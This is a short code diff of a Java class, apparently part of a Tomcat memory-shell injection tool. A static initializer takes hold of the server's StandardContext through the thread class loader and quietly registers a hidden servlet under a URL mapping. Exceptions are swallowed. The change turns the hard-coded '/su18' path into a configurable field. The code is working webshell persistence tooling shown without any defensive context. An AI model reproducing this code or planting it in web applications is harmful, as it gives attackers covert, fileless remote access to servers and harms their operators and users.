@@ -13,15 +13,16 @@ import java.lang.reflect.Field;
  */
 public class TSMSFromThread implements Servlet {
 
+	public static String pattern;
+
 	static {
 		try {
 			String servletName = "su18" + System.nanoTime();
-			String urlPattern   = "/su18";
 
 			// 获取 standardContext
 			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 
-			StandardContext       standardContext;
+			StandardContext standardContext;
 
 			try {
 				standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
@@ -45,7 +46,7 @@ public class TSMSFromThread implements Servlet {
 				wrapper.setServletClass(servlet.getClass().getName());
 				wrapper.setServlet(servlet);
 				ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
-				registration.addMapping(urlPattern);
+				registration.addMapping(pattern);
 			}
 		} catch (Exception ignored) {
 		}
